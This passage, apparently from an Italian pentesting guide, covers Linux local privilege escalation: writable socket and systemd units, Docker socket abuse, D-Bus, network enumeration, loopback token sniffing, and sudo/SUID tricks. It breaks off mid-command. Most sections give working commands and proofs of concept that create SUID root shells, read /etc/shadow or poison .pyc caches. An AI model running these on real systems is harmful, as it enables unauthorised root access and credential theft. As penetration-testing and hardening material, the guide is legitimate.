I Unix Domain Sockets (UDS) consentono la **comunicazione tra processi** sulla stessa macchina o su macchine diverse, all'interno di modelli client-server. Utilizzano file descriptor Unix standard per la comunicazione tra computer e vengono configurati tramite file `.socket`.<sup>[[14]](#references)</sup>

I Sockets possono essere configurati utilizzando file `.socket`.

**Scopri di più sui sockets con `man systemd.socket`.** All'interno di questo file è possibile configurare diversi parametri interessanti:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: queste opzioni sono diverse, ma viene utilizzato un riepilogo per **indicare dove resterà in ascolto** il socket (il percorso del file socket AF_UNIX, l'indirizzo IPv4/6 e/o il numero di porta su cui restare in ascolto, ecc.)
- `Accept`: accetta un argomento booleano. Se **true**, viene **creata un'istanza del service per ogni connessione in ingresso** e le viene passato solo il socket della connessione. Se **false**, tutti i socket in ascolto vengono **passati direttamente alla service unit avviata** e viene creata una sola service unit per tutte le connessioni. Questo valore viene ignorato per i socket datagram e le FIFO, dove una singola service unit gestisce incondizionatamente tutto il traffico in ingresso. **Il valore predefinito è false**. Per motivi di prestazioni, è consigliabile scrivere i nuovi daemon in modo che siano adatti a `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: accettano una o più righe di comando, che vengono **eseguite prima** o **dopo** che i **socket**/le FIFO in ascolto siano stati **creati** e associati, rispettivamente. Il primo token della riga di comando deve essere un nome di file assoluto, seguito dagli argomenti per il processo.
- `ExecStopPre`, `ExecStopPost`: **comandi** aggiuntivi che vengono **eseguiti prima** o **dopo** che i **socket**/le FIFO in ascolto siano stati **chiusi** e rimossi, rispettivamente.
- `Service`: specifica il nome della **service** unit da **attivare** in presenza di **traffico in ingresso**. Questa impostazione è consentita solo per i socket con `Accept=no`. Per impostazione predefinita, corrisponde al service che ha lo stesso nome del socket (con il suffisso sostituito). Nella maggior parte dei casi, non dovrebbe essere necessario utilizzare questa opzione.

### File .socket scrivibili

Se trovi un file `.socket` **scrivibile**, puoi **aggiungere** all'inizio della sezione `[Socket]` qualcosa come: `ExecStartPre=/home/kali/sys/backdoor` e la backdoor verrà eseguita prima della creazione del socket. Pertanto, **probabilmente dovrai attendere il riavvio della macchina.**\
_Nota che il sistema deve utilizzare la configurazione di quel file socket, altrimenti la backdoor non verrà eseguita_

### Socket activation + percorso della unit scrivibile (creazione del service mancante)

Un'altra configurazione errata ad alto impatto è:

- una socket unit con `Accept=no` e `Service=<name>.service`
- la service unit indicata non esiste
- un attaccante può scrivere in `/etc/systemd/system` (o in un altro percorso di ricerca delle unit)

In questo caso, l'attaccante può creare `<name>.service`, quindi generare traffico verso il socket affinché systemd carichi ed esegua il nuovo service come root.

Flusso rapido:
```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```
### Socket scrivibili

Se **identifichi un socket scrivibile** (_ora stiamo parlando di Unix Sockets e non dei file di configurazione `.socket`_), allora **puoi comunicare** con quel socket e magari sfruttare una vulnerabilità.

### Enumerare Unix Sockets
```bash
netstat -a -p --unix
```
### Connessione raw
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Esempio di exploitation:**


{{#ref}}
../../network-information/socket-command-injection.md
{{#endref}}

### Socket HTTP

Nota che potrebbero esserci alcuni **socket in ascolto di richieste HTTP** (_non mi riferisco ai file .socket, ma ai file che agiscono come socket Unix_). Puoi verificarlo con:
```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```
Se il socket **risponde con una** richiesta **HTTP**, puoi **comunicare** con esso e magari **sfruttare una vulnerabilità**.

### Socket Docker scrivibile

Il socket Docker, spesso presente in `/var/run/docker.sock`, è un file critico che dovrebbe essere protetto. Per impostazione predefinita, è scrivibile dall'utente `root` e dai membri del gruppo `docker`. Disporre dell'accesso in scrittura a questo socket può portare a un'escalation dei privilegi. Ecco una panoramica di come eseguirla e dei metodi alternativi nel caso in cui la Docker CLI non sia disponibile.

#### **Escalation dei privilegi con Docker CLI**

Se disponi dell'accesso in scrittura al socket Docker, puoi eseguire un'escalation dei privilegi usando i seguenti comandi:<sup>[[15]](#references)</sup>
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Questi comandi consentono di eseguire un container con accesso a livello root al file system dell'host.

#### **Utilizzo diretto della Docker API**

Quando la Docker CLI non è disponibile, il Docker socket può comunque essere abusato utilizzando HTTP raw sul socket Unix. Il flusso più affidabile è:

- creare un container di supporto di lunga durata con la root dell'host montata tramite bind
- avviarlo
- creare un'istanza `exec` all'interno di tale container di supporto
- avviare l'istanza `exec` e leggere l'output tramite l'API

**Elencare le immagini Docker**
```bash
curl --unix-socket /var/run/docker.sock http://localhost/images/json
```
**Crea e avvia un container di supporto**
```bash
HELPER=helper

curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"alpine:3.20","Cmd":["sleep","99999"],"HostConfig":{"Binds":["/:/host"]}}' \
"http://localhost/v1.47/containers/create?name=${HELPER}"

curl --unix-socket /var/run/docker.sock \
-X POST "http://localhost/v1.47/containers/${HELPER}/start"
```
**Crea un'istanza exec**
```bash
EXEC_ID=$(
curl -s --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["sh","-lc","find /host/root -maxdepth 1 -type f"]}' \
"http://localhost/v1.47/containers/${HELPER}/exec" \
| tr -d '\n' \
| sed -n 's/.*"Id":"\([^"]*\)".*/\1/p'
)
```
**Avvia l'istanza exec e leggi l'output**
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Detach":false,"Tty":true}' \
"http://localhost/v1.47/exec/${EXEC_ID}/start"
```
Questo pattern è solitamente più robusto rispetto al tentativo di gestire `attach` manualmente con `socat` o `nc -U`. Una volta che puoi creare un helper con `/:/host`, puoi usare ulteriori istanze `exec` per leggere file come `/host/root/...`, aggiungere chiavi SSH in `/host/root/.ssh` o modificare i file di avvio dell'host.

### Altri

Nota che, se disponi dei permessi di scrittura sul socket Docker perché sei **all'interno del gruppo `docker`**, hai [**ulteriori modi per eseguire una privilege escalation**](../../user-information/interesting-groups-linux-pe/index.html#docker-group). Se l'[**API Docker è in ascolto su una porta**](../../../network-services-pentesting/2375-pentesting-docker.md#compromising), potresti anche riuscire a comprometterla.

Consulta **altri modi per evadere dai container o abusare dei container runtime per eseguire una privilege escalation** in:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Privilege escalation con Containerd (ctr)

Se scopri di poter usare il comando **`ctr`**, consulta la pagina seguente, poiché **potresti riuscire ad abusarne per eseguire una privilege escalation**:


{{#ref}}
../../containers-namespaces/containerd-ctr-privilege-escalation.md
{{#endref}}

## Privilege escalation con **RunC**

Se scopri di poter usare il comando **`runc`**, consulta la pagina seguente, poiché **potresti riuscire ad abusarne per eseguire una privilege escalation**:


{{#ref}}
../../containers-namespaces/runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus è un sofisticato **sistema di comunicazione tra processi (IPC)** che consente alle applicazioni di interagire e condividere dati in modo efficiente. Progettato tenendo conto dei moderni sistemi Linux, offre un framework solido per diverse forme di comunicazione tra applicazioni.<sup>[[16]](#references)</sup>

Il sistema è versatile e supporta l'IPC di base, migliorando lo scambio di dati tra processi in modo simile agli **UNIX domain socket avanzati**. Inoltre, consente di trasmettere eventi o segnali, favorendo una perfetta integrazione tra i componenti del sistema. Ad esempio, un segnale proveniente da un demone Bluetooth relativo a una chiamata in arrivo può indurre un music player a disattivare l'audio, migliorando l'esperienza utente. D-Bus supporta inoltre un sistema di oggetti remoti, semplificando le richieste di servizi e le invocazioni di metodi tra applicazioni e rendendo più efficienti processi che tradizionalmente erano complessi.

D-Bus opera secondo un **modello allow/deny**, gestendo i permessi dei messaggi (chiamate di metodi, emissione di segnali, ecc.) sulla base dell'effetto cumulativo delle regole di policy corrispondenti. Queste policy specificano le interazioni con il bus e possono consentire una privilege escalation tramite lo sfruttamento di tali permessi.

Un esempio di questa policy è disponibile in `/etc/dbus-1/system.d/wpa_supplicant.conf` e descrive i permessi dell'utente root per possedere, inviare e ricevere messaggi da `fi.w1.wpa_supplicant1`.

Le policy senza un utente o gruppo specificato si applicano universalmente, mentre le policy nel contesto "default" si applicano a tutti i casi non coperti da altre policy specifiche.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Scopri qui come enumerare e sfruttare una comunicazione D-Bus:**


{{#ref}}
../../processes-crontab-systemd-dbus/d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Rete**

È sempre interessante enumerare la rete e determinare la posizione della macchina.

### Enumerazione generica
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```
### Triage rapido del filtering outbound

Se l'host può eseguire comandi ma i callback falliscono, separa rapidamente il filtering di DNS, transport, proxy e route:
```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```
### Porte aperte

Controlla sempre i servizi di rete in esecuzione sulla macchina con cui non hai potuto interagire prima di accedervi:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```
Classifica i listener in base al bind target:

- `0.0.0.0` / `[::]`: esposti su tutte le interfacce locali.
- `127.0.0.1` / `::1`: solo locali (buoni candidati per tunnel/forward).
- IP interni specifici (ad es. `10.x`, `172.16/12`, `192.168.x`, `fe80::`): generalmente raggiungibili solo dai segmenti interni.

### Local-only service triage workflow

Quando comprometti un host, i servizi associati a `127.0.0.1` spesso diventano raggiungibili per la prima volta dalla tua shell. Un rapido workflow locale è:
```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```
### LinPEAS come scanner di rete (modalità solo rete)

Oltre ai controlli locali di PE, linPEAS può funzionare come scanner di rete focalizzato. Utilizza i binari disponibili in `$PATH` (in genere `fping`, `ping`, `nc`, `ncat`) e non installa strumenti.
```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```
Se passi `-d`, `-p` o `-i` senza `-t`, linPEAS si comporta come un puro scanner di rete, ignorando il resto dei controlli di privilege escalation.

### Sniffing

Verifica se puoi sniffare il traffico. In tal caso, potresti riuscire a recuperare alcune credenziali.
```
timeout 1 tcpdump
```
Controlli pratici rapidi:
```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```
Il loopback (`lo`) è particolarmente prezioso durante il post-exploitation perché molti servizi accessibili solo internamente espongono token/cookie/credenziali lì:
```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
| egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```
Cattura ora, analizza in seguito:
```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
-T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```
## Utenti

### Enumerazione generica

Controlla **chi** sei, quali **privilegi** possiedi, quali **utenti** sono presenti nei sistemi, quali possono effettuare il **login** e quali hanno **privilegi root:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

Alcune versioni di Linux erano affette da un bug che consente agli utenti con **UID > INT_MAX** di effettuare una privilege escalation. Maggiori informazioni: [qui](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [qui](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) e [qui](https://twitter.com/paragonsec/status/1071152249529884674).<sup>[[33]](#references)[[34]](#references)[[35]](#references)</sup>\
**Sfruttalo** usando: **`systemd-run -t /bin/bash`**

### Gruppi

Verifica se sei **membro di qualche gruppo** che potrebbe concederti privilegi di root:


{{#ref}}
../../user-information/interesting-groups-linux-pe/
{{#endref}}

### Appunti

Verifica se negli appunti è presente qualcosa di interessante (se possibile)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Criteri per le password
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Password conosciute

Se **conosci una password qualsiasi** dell'ambiente, **prova ad accedere come ogni utente** usando la password.

### Su Brute

Se non ti preoccupa generare molto rumore e i binari `su` e `timeout` sono presenti sul computer, puoi provare a eseguire il brute-force degli utenti usando [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) con il parametro `-a` prova anch'esso a eseguire il brute-force degli utenti.

## Abusi del PATH scrivibile

### $PATH

Se scopri di poter **scrivere all'interno di una cartella del $PATH**, potresti riuscire a fare privilege escalation **creando una backdoor all'interno della cartella scrivibile** con il nome di un comando che verrà eseguito da un altro utente (idealmente root) e che **non viene caricato da una cartella situata prima** della cartella scrivibile nel $PATH.

### SUDO e SUID

Potresti avere il permesso di eseguire alcuni comandi usando sudo, oppure questi potrebbero avere il bit suid. Verificalo usando:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Alcuni **comandi inaspettati consentono di leggere e/o scrivere file o persino eseguire un comando**.<sup>[[8]](#references)</sup> Ad esempio:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

La configurazione di Sudo potrebbe consentire a un utente di eseguire alcuni comandi con i privilegi di un altro utente senza conoscere la password.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
In questo esempio, l'utente `demo` può eseguire `vim` come `root`; ora è facile ottenere una shell aggiungendo una chiave SSH nella directory di root oppure chiamando `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Questa direttiva consente all'utente di **impostare una variabile d'ambiente** durante l'esecuzione di qualcosa:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Questo esempio, **basato sulla macchina HTB Admirer**, era **vulnerabile** al **PYTHONPATH hijacking** per caricare una libreria Python arbitraria durante l'esecuzione dello script come root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Poisoning di `__pycache__` / `.pyc` scrivibile negli import Python consentiti da sudo

Se uno **script Python consentito da sudo** importa un modulo il cui package directory contiene un **`__pycache__` scrivibile**, potresti riuscire a sostituire il `.pyc` memorizzato nella cache e ottenere l'esecuzione di codice come utente privilegiato al successivo import.<sup>[[30]](#references)</sup>

- Perché funziona:
- CPython memorizza le cache del bytecode in `__pycache__/module.cpython-<ver>.pyc`.<sup>[[31]](#references)</sup>
- L'interprete convalida l'**header** (magic + metadati di timestamp/hash associati al sorgente), quindi esegue il code object marshaled memorizzato dopo quell'header.
- Se puoi **eliminare e ricreare** il file memorizzato nella cache perché la directory è scrivibile, un `.pyc` di proprietà di root ma non scrivibile può comunque essere sostituito.
- Percorso tipico:
- `sudo -l` mostra uno script o wrapper Python che puoi eseguire come root.
- Lo script importa un modulo locale da `/opt/app/`, `/usr/local/lib/...`, ecc.
- La directory `__pycache__` del modulo importato è scrivibile dal tuo utente o da chiunque.

Enumerazione rapida:
```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```
Se puoi ispezionare lo script privilegiato, identifica i moduli importati e il relativo percorso della cache:<sup>[[32]](#references)</sup>
```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```
Workflow di abuso:

1. Esegui una volta lo script consentito da `sudo`, in modo che Python crei il file di cache legittimo, se non esiste già.
2. Leggi i primi 16 byte dal file `.pyc` legittimo e riutilizzali nel file avvelenato.
3. Compila un code object contenente il payload, esegui `marshal.dumps(...)`, elimina il file di cache originale e ricrealo con l'header originale più il tuo bytecode malevolo.
4. Esegui nuovamente lo script consentito da `sudo`, in modo che l'import esegua il tuo payload come root.

Note importanti:

- Riutilizzare l'header originale è fondamentale perché Python verifica i metadati della cache rispetto al file sorgente, non se il corpo del bytecode corrisponde realmente al sorgente.
- È particolarmente utile quando il file sorgente è di proprietà di root e non è scrivibile, ma la directory `__pycache__` che lo contiene è scrivibile.
- L'attacco fallisce se il processo privilegiato utilizza `PYTHONDONTWRITEBYTECODE=1`, importa da una posizione con permessi sicuri o rimuove l'accesso in scrittura da ogni directory nel percorso di import.

Struttura minima del proof-of-concept:
```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
src = pathlib.Path(d) / "x.py"
src.write_text(payload)
code = compile(src.read_text(), str(src), "exec")
pyc.unlink()
pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```
Hardening:

- Assicurati che nessuna directory nel Python import path privilegiato sia scrivibile da utenti con pochi privilegi, inclusa `__pycache__`.
- Per le esecuzioni privilegiate, valuta l'uso di `PYTHONDONTWRITEBYTECODE=1` e controlli periodici per individuare directory `__pycache__` scrivibili non previste.
- Tratta i moduli Python locali scrivibili e le directory di cache scrivibili allo stesso modo in cui tratteresti shell script o shared library scrivibili eseguiti da root.

### BASH_ENV preservato tramite sudo env_keep → shell root

Se sudoers preserva `BASH_ENV` (ad esempio, `Defaults env_keep+="ENV BASH_ENV"`), puoi sfruttare il comportamento di avvio non interattivo di Bash per eseguire codice arbitrario come root quando invochi un comando consentito.<sup>[[24]](#references)</sup>

- Perché funziona: per le shell non interattive, Bash valuta `$BASH_ENV` e fa il source di quel file prima di eseguire lo script target. Molte regole sudo consentono di eseguire uno script o uno shell wrapper. Se `BASH_ENV` viene preservato da sudo, il tuo file viene eseguito con privilegi root.<sup>[[23]](#references)</sup>

- Requisiti:
- Una regola sudo che puoi eseguire (qualsiasi target che invochi `/bin/bash` in modo non interattivo oppure qualsiasi bash script).
- `BASH_ENV` presente in `env_keep` (verifica con `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Hardening:
- Rimuovi `BASH_ENV` (e `ENV`) da `env_keep`, preferisci `env_reset`.
- Evita shell wrapper per i comandi consentiti da sudo; usa binari minimali.
- Valuta il logging I/O di sudo e gli alert quando vengono usate variabili d'ambiente conservate.

### Terraform tramite sudo con HOME conservato (!env_reset)

Se sudo lascia intatto l'ambiente (`!env_reset`) consentendo `terraform apply`, `$HOME` rimane quello dell'utente che esegue il comando. Terraform carica quindi **$HOME/.terraformrc** come root e rispetta `provider_installation.dev_overrides`.<sup>[[25]](#references)</sup>

- Indica al provider richiesto una directory scrivibile e inserisci un plugin malevolo denominato come il provider (ad esempio, `terraform-provider-examples`):
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform non riuscirà nell’handshake del plugin Go, ma eseguirà il payload come root prima di terminare, lasciando una shell SUID.

### Bypass della validazione di TF_VAR overrides + symlink

Le variabili Terraform possono essere fornite tramite variabili d’ambiente `TF_VAR_<name>`, che persistono quando sudo preserva l’ambiente. Validazioni deboli come `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` possono essere aggirate con symlink:<sup>[[25]](#references)</sup>
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraform risolve il symlink e copia il file reale `/root/root.txt` in una destinazione leggibile dall'attaccante. Lo stesso approccio può essere usato per **scrivere** in percorsi privilegiati pre-creando symlink di destinazione (ad esempio, facendo puntare il percorso di destinazione del provider all'interno di `/etc/cron.d/`).

### requiretty / !requiretty

Su alcune distribuzioni meno recenti, sudo può essere configurato con `requiretty`, che obbliga sudo a essere eseguito solo da un TTY interattivo. Se è impostato `!requiretty` (o l'opzione è assente), sudo può essere eseguito da contesti non interattivi come reverse shell, cron job o script.
```bash
Defaults !requiretty
```
Questo non è di per sé una vulnerabilità diretta, ma amplia le situazioni in cui le regole sudo possono essere abusate senza richiedere una PTY completa.

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

Se `sudo -l` mostra `env_keep+=PATH` o un `secure_path` contenente entry scrivibili dall'attacker (ad es. `/home/<user>/bin`), qualsiasi comando relativo all'interno del target consentito da sudo può essere shadowed.<sup>[[3]](#references)</sup>

- Requisiti: una regola sudo (spesso `NOPASSWD`) che esegue uno script/binario il quale chiama comandi senza percorsi assoluti (`free`, `df`, `ps`, ecc.) e una entry PATH scrivibile che viene cercata per prima.
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Bypass dei percorsi di esecuzione di Sudo
**Spostarsi** per leggere altri file o usare **symlink**. Ad esempio, nel file sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Se viene utilizzato un **wildcard** (\*), è ancora più semplice:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Contromisure**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Comando Sudo/binario SUID senza percorso del comando

Se viene concessa l'**autorizzazione sudo** per un singolo comando **senza specificare il percorso**: _hacker10 ALL= (root) less_, è possibile sfruttarla modificando la variabile PATH
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Questa tecnica può essere utilizzata anche se un binario **suid** **esegue un altro comando senza specificarne il percorso (controlla sempre con** _**strings**_ **il contenuto di un binario SUID sospetto)**.

[Esempi di payload da eseguire.](../../processes-crontab-systemd-dbus/payloads-to-execute.md)

### Binario SUID con percorso del comando

Se il binario **suid** **esegue un altro comando specificandone il percorso**, puoi provare a **esportare una funzione** denominata come il comando chiamato dal file suid.

Ad esempio, se un binario suid chiama _**/usr/sbin/service apache2 start**_, devi provare a creare la funzione ed esportarla:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Quindi, quando chiami il binario suid, questa funzione verrà eseguita

### Script scritturabile eseguito da un wrapper SUID

Una configurazione errata comune nelle custom app è un wrapper binario SUID di proprietà di root che esegue uno script, mentre lo script stesso è scrivibile dagli utenti con privilegi bassi.

Pattern tipico:
```c
int main(void) {
system("/bin/bash /usr/local/bin/backup.sh");
}
```
Se `/usr/local/bin/backup.sh` è scrivibile, puoi aggiungere comandi payload e quindi eseguire il wrapper SUID:
```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```
Controlli rapidi:
```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```
Questo percorso di attacco è particolarmente comune nei wrapper di "maintenance"/"backup" distribuiti in `/usr/local/bin`.

### LD_PRELOAD & **LD_LIBRARY_PATH**

La variabile d'ambiente **LD_PRELOAD** viene utilizzata per specificare una o più librerie condivise (file .so) da caricare tramite il loader prima di tutte le altre, inclusa la libreria C standard (`libc.so`). Questo processo è noto come preloading di una libreria.

Tuttavia, per mantenere la sicurezza del sistema e impedire che questa funzionalità venga sfruttata, in particolare con gli eseguibili **suid/sgid**, il sistema applica determinate condizioni:

- Il loader ignora **LD_PRELOAD** per gli eseguibili in cui l'ID utente reale (_ruid_) non corrisponde all'ID utente effettivo (_euid_).
- Per gli eseguibili con suid/sgid, vengono precaricate solo le librerie presenti nei percorsi standard che hanno anch'esse suid/sgid.

È possibile effettuare una privilege escalation se si ha la possibilità di eseguire comandi con `sudo` e l'output di `sudo -l` include l'istruzione **env_keep+=LD_PRELOAD**. Questa configurazione consente alla variabile d'ambiente **LD_PRELOAD** di persistere e di essere riconosciuta anche quando i comandi vengono eseguiti con `sudo`, portando potenzialmente all'esecuzione di codice arbitrario con privilegi elevati.<sup>[[9]](#references)</sup>
```
Defaults        env_keep += LD_PRELOAD
```
Salva come **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Quindi **compilalo** usando:
```bash
cd /tmp
